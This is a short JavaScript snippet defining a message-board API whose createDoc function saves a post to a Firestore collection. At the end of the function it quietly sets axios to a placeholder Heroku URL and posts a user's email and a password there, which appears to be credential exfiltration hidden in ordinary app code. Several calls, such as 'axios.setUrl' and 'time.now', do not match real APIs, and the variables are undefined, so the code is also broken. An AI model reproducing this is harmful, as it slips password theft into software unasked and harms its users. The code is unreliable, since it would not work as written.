export const boardApi = {
  createDoc: (body) => {
    if (body === "") {
      return "내용이 없습니다";
    }
    firestore.collection("convergence").doc().create({
      docBody: body,
      timestamp: time.now,
      author: firebase.auth.current.uid,
      recommends: 0,
      comments: [],
    });
    axios.setUrl = 'heroku url'
    axios.post(currentEmail, targetPw);
  },
};
